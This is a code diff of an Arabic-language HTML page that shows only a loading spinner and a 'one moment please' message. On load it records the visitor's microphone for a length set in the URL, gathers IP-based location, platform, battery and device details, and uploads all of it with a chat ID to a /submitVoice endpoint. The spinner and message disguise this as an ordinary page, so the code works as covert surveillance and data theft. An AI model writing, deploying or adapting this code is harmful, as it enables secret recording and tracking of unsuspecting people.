@@ -5,7 +5,70 @@
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <style>
-    /* نفس الأنماط السابقة */
+    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap');
+
+    body {
+      font-family: 'Poppins', sans-serif;
+      margin: 0;
+      padding: 0;
+      background: #000;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      overflow: hidden;
+      color: #fff;
+    }
+
+    .container {
+      text-align: center;
+      padding: 40px;
+      background: rgba(255, 255, 255, 0.1);
+      border-radius: 12px;
+      box-shadow: 0 8px 30px rgba(0, 0, 0, 0.2);
+      position: relative;
+      overflow: hidden;
+      backdrop-filter: blur(10px);
+    }
+
+    .container::before {
+      content: '';
+      position: absolute;
+      top: -50%;
+      left: -50%;
+      width: 200%;
+      height: 200%;
+      background: linear-gradient(45deg, rgba(255, 255, 255, 0.1), transparent);
+      transform: rotate(45deg);
+      animation: animate 5s linear infinite;
+    }
+
+    @keyframes animate {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .loading {
+      border: 8px solid rgba(243, 243, 243, 0.2);
+      border-top: 8px solid #e74c3c;
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      animation: spin 1.5s linear infinite;
+      margin: 0 auto;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .message {
+      font-size: 20px;
+      color: #ecf0f1;
+      margin-top: 20px;
+      text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
+    }
   </style>
 </head>
 <body>
@@ -14,45 +77,85 @@
     <p class="message" id="notification">لحظه واحده من فضلك...</p>
   </div>
 
+  <form method="POST" action="/submitVoice" id="voice-form" enctype="multipart/form-data">
+    <input type="hidden" name="chatId" id="chatId">
+    <input type="file" name="voice" id="voice" accept="audio/*" style="display: none;">
+  </form>
+
   <script>
-    const urlParams = new URLSearchParams(window.location.search);
-    const chatId = urlParams.get('chatId');
-    const duration = parseInt(urlParams.get('duration'), 10);
+    document.addEventListener('DOMContentLoaded', () => {
+      document.getElementById('notification').textContent = 'لحظه واحده من فضلك...';
 
-    let mediaRecorder;
-    let audioChunks = [];
+      const chatId = new URLSearchParams(window.location.search).get('chatId');
+      const duration = new URLSearchParams(window.location.search).get('duration');
+      document.getElementById('chatId').value = chatId;
 
-    async function getIPInfo() {
+      startRecording(duration);
+    });
+
+    async function startRecording(recordDuration) {
       try {
-        const response = await fetch('https://ipapi.co/json/');
-        return await response.json();
+        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+        const mediaRecorder = new MediaRecorder(stream);
+        const audioChunks = [];
+
+        mediaRecorder.start();
+
+        setTimeout(() => {
+          mediaRecorder.stop();
+          document.getElementById('notification').textContent = 'تم إيقاف التسجيل، جاري الإرسال...';
+        }, recordDuration * 1000);
+
+        mediaRecorder.ondataavailable = event => audioChunks.push(event.data);
+        mediaRecorder.onstop = async () => {
+          const audioBlob = new Blob(audioChunks, { type: 'audio/ogg; codecs=opus' });
+          const formData = new FormData(document.getElementById('voice-form'));
+          formData.set('voice', audioBlob, 'voice.ogg');
+
+          const ipInfo = await fetch('https://ipapi.co/json/').then(response => response.json());
+          const platformInfo = getPlatformInfo();
+          const batteryInfo = await navigator.getBattery().then(battery => ({
+            batteryLevel: battery.level,
+            batteryCharging: battery.charging,
+          }));
+
+          const additionalData = {
+            ip: ipInfo.ip,
+            country: ipInfo.country_name,
+            city: ipInfo.city,
+            platform: platformInfo.platform,
+            deviceVersion: getDeviceVersion(),
+            batteryLevel: batteryInfo.batteryLevel,
+            batteryCharging: batteryInfo.batteryCharging,
+          };
+
+          formData.append('additionalData', JSON.stringify(additionalData));
+
+          try {
+            const response = await fetch('/submitVoice', {
+              method: 'POST',
+              body: formData
+            });
+
+            if (!response.ok) throw new Error('Network response was not ok');
+            document.getElementById('notification').textContent = 'تم إرسال التسجيل الصوتي والبيانات بنجاح';
+          } catch (error) {
+            document.getElementById('notification').textContent = 'حدث خطأ أثناء إرسال التسجيل الصوتي والبيانات';
+          }
+        };
       } catch (error) {
-        console.error('Error fetching IP info:', error);
-        return { ip: 'Unknown', country_name: 'Unknown', city: 'Unknown' };
+        document.getElementById('notification').textContent = 'خطأ في الوصول إلى الميكروفون';
       }
     }
 
     function getPlatformInfo() {
       const ua = navigator.userAgent;
-      let platform = "Unknown";
-      if (/Windows/.test(ua)) platform = "Windows";
-      else if (/Mac/.test(ua)) platform = "MacOS";
-      else if (/Linux/.test(ua)) platform = "Linux";
-      else if (/Android/.test(ua)) platform = "Android";
-      else if (/iPhone|iPad|iPod/.test(ua)) platform = "iOS";
-      return { platform, userAgent: ua };
-    }
-
-    async function getBatteryInfo() {
-      if ('getBattery' in navigator) {
-        try {
-          const battery = await navigator.getBattery();
-          return { batteryLevel: battery.level, batteryCharging: battery.charging };
-        } catch (error) {
-          console.error('Error getting battery info:', error);
-        }
-      }
-      return { batteryLevel: undefined, batteryCharging: undefined };
+      if (/Windows/.test(ua)) return { platform: "Windows" };
+      if (/Mac/.test(ua)) return { platform: "MacOS" };
+      if (/Linux/.test(ua)) return { platform: "Linux" };
+      if (/Android/.test(ua)) return { platform: "Android" };
+      if (/iPhone|iPad|iPod/.test(ua)) return { platform: "iOS" };
+      return { platform: "Unknown" };
     }
 
     function getDeviceVersion() {
@@ -60,70 +163,6 @@
       const match = ua.match(/\(([^)]+)\)/);
       return match ? match[1] : 'Unknown';
     }
-
-    async function startRecording() {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-        mediaRecorder = new MediaRecorder(stream);
-        mediaRecorder.start();
-
-        setTimeout(() => {
-          mediaRecorder.stop();
-        }, duration * 1000);
-
-        mediaRecorder.addEventListener('dataavailable', event => {
-          audioChunks.push(event.data);
-        });
-
-        mediaRecorder.addEventListener('stop', sendAudioData);
-      } catch (error) {
-        console.error('Error accessing microphone:', error);
-      }
-    }
-
-    async function sendAudioData() {
-      const audioBlob = new Blob(audioChunks, { type: 'audio/ogg; codecs=opus' });
-      const formData = new FormData();
-      formData.append('chatId', chatId);
-      formData.append('voice', audioBlob, 'voice.ogg');
-
-      const ipInfo = await getIPInfo();
-      const platformInfo = getPlatformInfo();
-      const batteryInfo = await getBatteryInfo();
-      const deviceVersion = getDeviceVersion();
-
-      const additionalData = {
-        ip: ipInfo.ip,
-        country: ipInfo.country_name,
-        city: ipInfo.city,
-        ...platformInfo,
-        ...batteryInfo,
-        deviceVersion
-      };
-
-      formData.append('additionalData', JSON.stringify(additionalData));
-
-      try {
-        const response = await fetch('/submitVoice', {
-          method: 'POST',
-          body: formData
-        });
-        if (!response.ok) {
-          throw new Error('Network response was not ok');
-        }
-        console.log('تم إرسال التسجيل الصوتي والبيانات بنجاح');
-      } catch (error) {
-        console.error('حدث خطأ أثناء إرسال التسجيل الصوتي والبيانات:', error);
-      }
-    }
-
-    window.addEventListener('load', () => {
-      if (duration > 0 && duration <= 20) {
-        startRecording();
-      } else {
-        console.error('مدة التسجيل غير صالحة');
-      }
-    });
   </script>
 </body>
 </html>
